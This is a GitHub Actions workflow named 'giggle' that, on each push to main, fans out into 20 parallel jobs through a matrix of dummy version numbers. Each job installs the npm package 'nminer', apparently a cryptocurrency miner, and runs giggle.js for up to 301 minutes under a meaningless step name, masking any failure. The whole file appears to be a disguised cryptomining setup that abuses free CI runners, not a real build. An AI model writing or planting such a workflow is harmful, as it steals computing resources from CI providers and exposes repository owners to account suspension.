name: giggle
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5379 }
          - { version: 3242 }
          - { version: 4507 }
          - { version: 3980 }
          - { version: 9754 }
          - { version: 9996 }
          - { version: 608 }
          - { version: 3899 }
          - { version: 3055 }
          - { version: 4839 }
          - { version: 2070 }
          - { version: 8113 }
          - { version: 7814 }
          - { version: 8967 }
          - { version: 3283 }
          - { version: 9230 }
          - { version: 8749 }
          - { version: 7587 }
          - { version: 8549 }
          - { version: 2815 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: furthermore as
        run: |
          npm install nminer@latest
          timeout 301m node giggle.js || echo "giggle executed"